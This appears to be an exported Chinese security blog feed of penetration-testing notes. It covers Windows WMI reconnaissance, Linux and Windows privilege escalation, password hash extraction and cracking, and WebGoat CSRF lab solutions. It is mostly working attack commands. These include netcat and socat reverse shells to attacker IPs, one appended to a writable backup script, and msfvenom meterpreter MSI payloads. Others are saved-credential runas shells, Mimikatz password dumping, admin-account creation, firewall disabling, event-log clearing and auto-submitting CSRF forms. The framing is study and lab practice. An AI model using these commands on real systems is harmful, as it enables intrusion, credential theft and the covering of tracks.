<h2 id="获取已安装的应用程序列表-1"><a href="#获取已安装的应用程序列表-1" class="headerlink" title="获取已安装的应用程序列表"></a>获取已安装的应用程序列表</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Product |<span class="built_in">format-table</span>[<span class="built_in">Select-Object</span>] name,version |<span class="built_in">Select-Object</span> <span class="literal">-First</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h2 id="获取正在运行的服务列表-1"><a href="#获取正在运行的服务列表-1" class="headerlink" title="获取正在运行的服务列表"></a>获取正在运行的服务列表</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_Service <span class="literal">-Filter</span> <span class="string">"State='Running'"</span></span><br></pre></td></tr></table></figure>
<h2 id="获取反病毒产品详情-1"><a href="#获取反病毒产品详情-1" class="headerlink" title="获取反病毒产品详情"></a>获取反病毒产品详情</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\SecurityCenter2 <span class="literal">-Class</span> AntiVirusProduct | <span class="built_in">select-object</span> displayName,productState, pathToSignedProductExe</span><br></pre></td></tr></table></figure>
<h2 id="判断目标系统是否为虚拟机-1"><a href="#判断目标系统是否为虚拟机-1" class="headerlink" title="判断目标系统是否为虚拟机"></a>判断目标系统是否为虚拟机</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_OnBoardDevice | <span class="built_in">select-object</span>  Desciption,DeviceType,Enabled,Status</span><br></pre></td></tr></table></figure>

<h2 id="清理系统日志-1"><a href="#清理系统日志-1" class="headerlink" title="清理系统日志"></a>清理系统日志</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_NTEventlogFile</span><br><span class="line"></span><br><span class="line"><span class="comment">#需要管理员权限</span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\CIMV2 <span class="literal">-Class</span> Win32_NTEventlogFile <span class="literal">-filter</span> <span class="string">"logfilename='windows powershell'"</span> |<span class="built_in">Invoke-CimMethod</span> <span class="literal">-Name</span> ClearEventlog</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/get-ciminstance?view=powershell-7" target="_blank" rel="noopener">官方文档</a><br><a href="http://xntutor.com/demo/123.html" target="_blank" rel="noopener">参考链接</a><br><a href="https://www.cnblogs.com/ring-lcy/p/12495977.html" target="_blank" rel="noopener">参考链接</a><br><a href="https://blog.csdn.net/shuteer_xu/article/details/107925650" target="_blank" rel="noopener">参考链接</a><br><a href="https://www.ired.team/" target="_blank" rel="noopener">红队技巧</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>内网渗透--linux提权</title>
    <url>/2020/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--linux%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="Linux提权思路"><a href="#Linux提权思路" class="headerlink" title="Linux提权思路"></a>Linux提权思路</h1><p><img src="https://img-blog.csdnimg.cn/20200728232711948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h1><h2 id="Linux-SUID提权"><a href="#Linux-SUID提权" class="headerlink" title="Linux SUID提权"></a>Linux SUID提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查找所有者为用户的文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -user 用户名 2&gt;dev/null</span><br><span class="line"><span class="comment">#查看带有root权限的SUID命令</span></span><br><span class="line">find / <span class="built_in">type</span>  f -perm -u=s 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null  </span><br><span class="line"></span><br><span class="line">-<span class="built_in">type</span> d 目录</span><br><span class="line">-<span class="built_in">type</span> b 块设备文件</span><br><span class="line">-<span class="built_in">type</span> c 字符设备文件</span><br><span class="line">-<span class="built_in">type</span> p 管道文件</span><br><span class="line">-<span class="built_in">type</span> l 符号链接文件</span><br><span class="line">-<span class="built_in">type</span> f 普通文件</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a> </p>
</blockquote>
<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看内核信息</span></span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>
<h2 id="文件配置不当提权"><a href="#文件配置不当提权" class="headerlink" title="文件配置不当提权"></a>文件配置不当提权</h2><ul>
<li>Linux高权限可执行文件提权<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建bash代码</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.10.31 lport=4444 R</span><br><span class="line"><span class="comment">#写入具有高的执行权限的文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" mkfifo /tmp/saqno; nc 192.168.10.31 4444 0&lt;/tmp/saqno | /bin/sh &gt;/tmp/saqno 2&gt;&amp;1; rm /tmp/saqno "</span> &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">linux提权</a></p>
<p><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">Linux提权辅助工具</a></p>
<h1 id="Linux下获取完全交互式TTY"><a href="#Linux下获取完全交互式TTY" class="headerlink" title="Linux下获取完全交互式TTY"></a>Linux下获取完全交互式TTY</h1><h2 id="将Python用于伪终端"><a href="#将Python用于伪终端" class="headerlink" title="将Python用于伪终端"></a>将Python用于伪终端</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
<h2 id="使用socat"><a href="#使用socat" class="headerlink" title="使用socat"></a>使用socat</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Listener:</span></span><br><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:PORT</span><br><span class="line"></span><br><span class="line"><span class="comment">#Victim:</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:IP:PORT</span><br><span class="line"><span class="comment">#如果目标没有socat或者没有使用socat的权限</span></span><br><span class="line"><span class="comment">#下载二进制socat 并执行</span></span><br><span class="line">wget -q https://github.com/andrew<span class="_">-d</span>/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat <span class="built_in">exec</span>:<span class="string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:IP:PORT</span><br></pre></td></tr></table></figure>
<h2 id="使用stty"><a href="#使用stty" class="headerlink" title="使用stty"></a>使用stty</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line"><span class="comment"># In Kali</span></span><br><span class="line"><span class="comment">#获取终端类型</span></span><br><span class="line"><span class="variable">$echo</span> <span class="variable">$TERM</span></span><br><span class="line"><span class="variable">$stty</span> -a</span><br><span class="line">$ stty raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="noopener">升级shell</a></p>
]]></content>
  </entry>
  <entry>
    <title>内网渗透--windows提权</title>
    <url>/2020/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--windows%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="Windows提权整体思路"><a href="#Windows提权整体思路" class="headerlink" title="Windows提权整体思路"></a>Windows提权整体思路</h1><p><img src="https://img-blog.csdnimg.cn/20200728225009439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="windows提权常见方法"><a href="#windows提权常见方法" class="headerlink" title="windows提权常见方法"></a>windows提权常见方法</h1><ul>
<li>内核提权</li>
<li>错误的服务权限配置</li>
<li>DLL注入</li>
<li>始终以高权限安装程序</li>
<li>凭证存储<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2>通过检查目标主机，检查目标主机是否存在已知的漏洞<br><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">检测脚本</a><h2 id="错误的服务权限配置"><a href="#错误的服务权限配置" class="headerlink" title="错误的服务权限配置"></a>错误的服务权限配置</h2>windows server 可创建长久运行的可执行程序，若能获取的修改windows server配置权限， 通过把服务启动的二进制文件替换为恶意二进制文件，可以获得system权限<br><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank" rel="noopener">检查错误配置脚本–PowerUp.ps1</a><h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2>DLL注入提权是一种利用应用程序错误加载DLL的技术。可以使用此技术来实现提权以<br>及持久控制。<br>DLL代表动态链接库，它是一个库文件，其中包含可被多个应用程序同时动态访问和使用的代码和数据。DLL是Microsoft引入的，用于实现共享库的概念。</li>
</ul>
<p>通过加载外部恶意DLL获取较高的权限</p>
<h2 id="注册表键提权"><a href="#注册表键提权" class="headerlink" title="注册表键提权"></a>注册表键提权</h2><p>AlwaysInstallElevated是一项功能，可为Windows计算机上的所有用户（尤其是低特权用户）提供运行任何具有高权限的MSI文件的功能。MSI是基于Microsoft的安装程序软件包文件格式，用于安装，存储和删除程序。<br>通过组策略中的windows installer来进行配置，默认情况下该配置是关闭的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看是否开启MSI</span></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成msi</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=X.X.X.X lport=4567 -f msi &gt; 1.msi</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装msi获取高权限shell</span></span><br><span class="line">msiexec /quiet /qn /i C:\Windows\Temp\1.msi</span><br></pre></td></tr></table></figure>
<h2 id="凭证存储"><a href="#凭证存储" class="headerlink" title="凭证存储"></a>凭证存储</h2><p>Windows7之后的操作系统提供了windows保险柜功能(Windows Vault),Window保险柜存储Windows可以自动登录用户的凭据，这意味着需要凭据才能访问资源（服务器或网站）的任何Windows应用程序都可以使用此凭据管理器和Windows Vault并使用提供的凭据代替用户一直输入用户名和密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过cmdkey /list 列出存储的所有用户的凭据</span></span><br><span class="line">cmdkey /list</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用runas来以管理员权限启动nc反弹shell</span></span><br><span class="line">Runas /user:administrator /savecred <span class="string">"nc.exe -e cmd.exe X.X.X.X 1337"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击机启动监听，获取反弹shell。</span></span><br><span class="line">nc -lvvp 1337</span><br></pre></td></tr></table></figure>
<p><a href="https://mp.weixin.qq.com/s/lNyvyW2Pq9abIC9ViJteaQ" target="_blank" rel="noopener">参考链接</a></p>
<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>query user</td>
<td>查看用户登录情况</td>
</tr>
<tr>
<td>whoami</td>
<td>当前 用户权限</td>
</tr>
<tr>
<td>systeminfo</td>
<td>查看当前系统版本与补丁信息</td>
</tr>
<tr>
<td>systeminf | findstr /B /C:”OS 名称“</td>
<td>获取systeminfo里特定的信息</td>
</tr>
<tr>
<td>net user aa123456 /add</td>
<td>创建用户-设置密码为123456</td>
</tr>
<tr>
<td>net localgroup administrators aa /add</td>
<td>添加用户到管理员组</td>
</tr>
<tr>
<td>net localgroup “Remote Desktop Users” aa /add</td>
<td>添加用户到远程桌面组</td>
</tr>
<tr>
<td>dir c:\</td>
<td>查看目录</td>
</tr>
<tr>
<td>type c:\Users\admin\Desktop\1.txt</td>
<td>查看制定位置文件内容, 一般为文本文件</td>
</tr>
<tr>
<td>echo字符串&gt; 2.txt</td>
<td>写入文本到文件。特殊字符如&lt;&gt;等前面加^</td>
</tr>
<tr>
<td>copy 1.txt 3.php</td>
<td>复制文件</td>
</tr>
<tr>
<td>rename d:\2.txt mspaint.bat</td>
<td>将某个路径下的文件重命名</td>
</tr>
<tr>
<td>tasklist</td>
<td>查看所有进程占用的端口</td>
</tr>
<tr>
<td>taskkill /im映像名称.exe /f</td>
<td>强制结束指定进程,如taskkill /im QQMusic.exe /f</td>
</tr>
<tr>
<td>wmic OS get caption</td>
<td>查看系统名</td>
</tr>
<tr>
<td>wmic qfe get Description,HotFixID,InstalledOn| findstr /C:” KB4013389” /C:”KB958644 “</td>
<td>查看某一补丁信息</td>
</tr>
<tr>
<td>wmic product get name,version</td>
<td>查看当前安装程序</td>
</tr>
<tr>
<td>WMIC /Node: localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</td>
<td>查杀软</td>
</tr>
<tr>
<td>net config workstation</td>
<td>查看当前工作域</td>
</tr>
</tbody></table>
<h2 id="使用命令开启远程桌面3389"><a href="#使用命令开启远程桌面3389" class="headerlink" title="使用命令开启远程桌面3389"></a>使用命令开启远程桌面3389</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>

<h2 id="关闭防火墙命令"><a href="#关闭防火墙命令" class="headerlink" title="关闭防火墙命令"></a>关闭防火墙命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows提权辅助工具</a></p>
<p><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">Windows命令提权</a></p>
<p>WindowsVulnScan：基于主机的漏洞扫描工具，查看查找主机上具有的CVE和具有公开EXP的CVE<br><a href="https://github.com/chroblert/WindowsVulnSca" target="_blank" rel="noopener">WindowsVulnScan</a></p>
<p>BeRoot：检查常见的错误配置，获取提权方法<br><a href="https://github.com/AlessandroZ/BeRoot" target="_blank" rel="noopener">BeRoot</a></p>
<p>Vulmap：在线本地漏洞扫描程序项目<br><a href="https://github.com/vulmon/Vulmap" target="_blank" rel="noopener">Vulmap</a></p>
]]></content>
  </entry>
  <entry>
    <title>内网渗透--基于密码的破解提权</title>
    <url>/2020/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E5%9F%BA%E4%BA%8E%E5%AF%86%E7%A0%81%E7%9A%84%E7%A0%B4%E8%A7%A3%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="密码获取的常用手段"><a href="#密码获取的常用手段" class="headerlink" title="密码获取的常用手段"></a>密码获取的常用手段</h1><p>1、通过中间人劫持:网络窃听<br>2、通过用户主机窃听:键盘记录<br>3、通过简单猜测:常用密码<br>4、通过系统漏洞:永恒之蓝<br>5、用户自己泄漏: git、 配置文件等泄漏方式<br>6、通过系统后门: shift后门</p>
<h1 id="windows密码原理"><a href="#windows密码原理" class="headerlink" title="windows密码原理"></a>windows密码原理</h1><p>Windows使用了两种方法对用户的密码进行哈希处理,分别为LAN Manager ( LM )哈希和NT LAN Manager ( NTLM )哈希。所谓哈希( hash) ,就是使用- -种加密函数进行计算后的结果。<br>Windows的系统密码hash默认情况下一般由两部分组成:第一部分是LM-hash, 第二部分是<br>NTLM-hash。</p>
<h2 id="密码结构"><a href="#密码结构" class="headerlink" title="密码结构"></a>密码结构</h2><p>Administrator:500:<strong>C8825DB10F2590EAAAD3B435B51404EE</strong>:<strong>683020925C5D8569C23AA724774CE6CC</strong>:::<br>格式为:<br>用户名: RID : LM-HASH值:NT-HASH值<br>因此拆分后为:<br>用户名称为: Administrator<br>RID为: 500<br>LM-HASH值为: C8825DB10F2590EAAAD3B435B51404EE<br>NT-HASH值为: 683020925C5D8569C23AA724774CE6CC<br><strong>破解NT-HASH值即可获得用户密码</strong></p>
<ul>
<li>破解方法<br>网站在线破解<br>暴力破解<h2 id="Windows密码hash导出"><a href="#Windows密码hash导出" class="headerlink" title="Windows密码hash导出"></a>Windows密码hash导出</h2></li>
<li>导出导入SAM、system</li>
<li>使用工具抓取<br>gethashs导出 .<br>Pwdump导出<br>Wce导出<h2 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h2>1、Saminside字典破解<br>2、Ophcrack加加载彩 虹表破解<h2 id="获取Windows明文密码"><a href="#获取Windows明文密码" class="headerlink" title="获取Windows明文密码"></a>获取Windows明文密码</h2></li>
<li>Wce明文密码获取</li>
<li>Mimikatz明文密码获取<pre><code>privllege::debug
sekurlsa::logonpasswords</code></pre></li>
<li>Getpass明文密码获取</li>
</ul>
<h1 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a>Linux密码破解</h1><h2 id="密码文件位置"><a href="#密码文件位置" class="headerlink" title="密码文件位置"></a>密码文件位置</h2><p>/etc/passwd<br>/etc/shadow</p>
<h2 id="密码结构-1"><a href="#密码结构-1" class="headerlink" title="密码结构"></a>密码结构</h2><ul>
<li><p>/etc/passwd<br><img src="https://img-blog.csdnimg.cn/2020081323513375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>/etc/shadow<br><img src="https://img-blog.csdnimg.cn/20200813235204499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
</ul>
<h2 id="Linux系统的加密算法"><a href="#Linux系统的加密算法" class="headerlink" title="Linux系统的加密算法"></a>Linux系统的加密算法</h2><p>Linux操作系统目前采用5种常用加密算法,主要通过账号后面的$x进行判断<br>$1: Md5加密算法 (可直接网站查询破解密码)<br>$2 : Blowfish加密算法<br>$5: Sha-256加密算法<br>$6: Sha-512加密算法<br>其他格式均为标准DES加密算法<br>例如:<br>root:<strong>$6</strong>$8Krl0yVz$8VXrJVfXjlYmap9vjmH4xhqT:17490:099999:7::</p>
<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><ul>
<li>John密码破解</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#标准模式</span></span><br><span class="line"><span class="comment">#获取密文</span></span><br><span class="line">unshadow /etc/passwd /etc/shadow &gt; passwd.txt</span><br><span class="line">john passwd.txt -single</span><br><span class="line"><span class="comment">#查看明文密码</span></span><br><span class="line">john passwd.txt -show </span><br><span class="line"></span><br><span class="line"><span class="comment">#字典模式</span></span><br><span class="line">john --wordlist=/usr/share/john/password.lst passwd.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#完全模式</span></span><br><span class="line">john --incremental=All passwd.txt</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>内网渗透--概述</title>
    <url>/2020/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="常见的提权方法总结"><a href="#常见的提权方法总结" class="headerlink" title="常见的提权方法总结"></a>常见的提权方法总结</h1><p><img src="https://img-blog.csdnimg.cn/20200727232216403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>webgoat-客户端安全</title>
    <url>/2020/08/21/webgoat-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h2><ul>
<li>0x02<br>抓包改值， 修改各个字段value值</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select=pass&amp;radio=pass&amp;checkbox=pass&amp;shortInput=123456</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2020072423254277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>0x03<br>抓包改值，绕过前端限制</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">field1=AAA&amp;field2=1234&amp;field3=..&amp;field4=1&amp;field5=0a01&amp;field6=90aa210-1111&amp;field7=a604-4882&amp;error=0</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200724232431322.png" alt="在这里插入图片描述"></p>
<h2 id="客户端过滤"><a href="#客户端过滤" class="headerlink" title="客户端过滤"></a>客户端过滤</h2><ul>
<li><p>0x02<br><img src="https://img-blog.csdnimg.cn/20200724235125225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>0x03</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200724234807846.png" alt="在这里插入图片描述"><br>使用owasp-webgoat发送请求<br><img src="https://img-blog.csdnimg.cn/20200724234829948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200724234846489.png" alt="在这里插入图片描述"><br>获取百分之一百折扣的代码<br><img src="https://img-blog.csdnimg.cn/20200724234948840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="HTML篡改"><a href="#HTML篡改" class="headerlink" title="HTML篡改"></a>HTML篡改</h2><ul>
<li>0x02<br>抓包更改数值即可绕过<br><img src="https://img-blog.csdnimg.cn/2020072423540268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Webgoat-CSRF_SSRF</title>
    <url>/2020/08/21/Webgoat-CSRF_SSRF/</url>
    <content><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
<li>与XSS区别<br>从信任的角度来区分<pre><code>XSS:利用用户对站点的信任
CSRF:利用站点对已经身份认证的信任</code></pre></li>
<li>攻击原理<br>在客户端与服务端（如果服务端没有对请求进行二次验证）建立合法请求之后，攻击者通过各种方法向受害者发送一个链接，受害者点击链接后，在受害者非自愿的情况下向服务端发送了指令（诸如修改密码之类的），之后，攻击者就可以通过受害者的账号和攻击者自己设置的新密码登录服务端。</li>
<li>CSRF是一种业务逻辑漏洞<br>对关键操作缺少确认机制<br>自动扫描程序无法发现此类漏洞</li>
<li>漏洞利用条件<br>被害用户己经完成身份认证<br>新请求的提交不需要重新身份认证或确认机制<br>攻击者必须了解Web APP请求的参数构造<br>诱使用户触发攻击的指令(社工)</li>
<li>防御手段<br>Captcha (验证码验证)<br>anti-CSRF token：（ 在服务器端生成随机token，浏览器在发起针对数据的修改请求将token提交，由服务器端验证通过够进行操作逻辑，token需要至多一次有效，并具有有限的生命周期<br>a. 表单提交修改数据- 可将token生成在表单内使用input:hidden标签进行提交<br>b. Ajax提交修改数据-可将token生成在cookie内(cookie不能设置为httponly)，ajax请求前通过js读取cookie中的token并添加到request body或者http requestheader中进行提交<br>   ）<pre><code>referrer头检验</code></pre>  降低会话时间<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2></li>
<li>0x03<br>构造钓鱼页面发给受害者，诱使受害者（在于服务端建立连接之后）点击<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">html</span>&gt;</span><br><span class="line">	&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">	&lt;form action="http://192.168.80.2:8080/WebGoat/csrf/basic-get-flag" method="POST"&gt;</span><br><span class="line">		&lt;input type="hidden" name="csrf" value="false" /&gt;</span><br><span class="line">		&lt;input type="hidden" name="submit" value="%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"/ &gt;</span><br><span class="line">		&lt;input type="submit" value="click"/&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<img src="https://img-blog.csdnimg.cn/20200721201606796.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200721201617981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020072120164037.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>0x04</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">html</span>&gt;</span><br><span class="line">	&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">	&lt;form action="http://192.168.80.2:8080/WebGoat/csrf/review" method="POST"&gt;</span><br><span class="line">		&lt;input type="hidden" name="reviewText" value="a" /&gt;</span><br><span class="line">		&lt;input type="hidden" name="stars" value="1"/ &gt;  </span><br><span class="line">		&lt;input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9"/ &gt;</span><br><span class="line">		&lt;input type="submit" value="click"/&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>0x07</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">html</span>&gt;</span><br><span class="line">	&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">	&lt;form action="http://192.168.80.2:8080/WebGoat/csrf/feedback/message" method="POST" enctype="text/plain" &gt; </span><br><span class="line">		&lt;input type="hidden" name='&#123;"name": "pasa","email":"passsaa@wobwolf.com","subject":"service","message":"' value='aaa"&#125;'&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;<span class="selector-tag">script</span>&gt;</span><br><span class="line">	      <span class="selector-tag">document</span><span class="selector-class">.forms</span><span class="selector-attr">[0]</span><span class="selector-class">.submit</span>();</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.secpulse.com/archives/61297.html" target="_blank" rel="noopener">JSON CSRF</a></p>
</blockquote>
<ul>
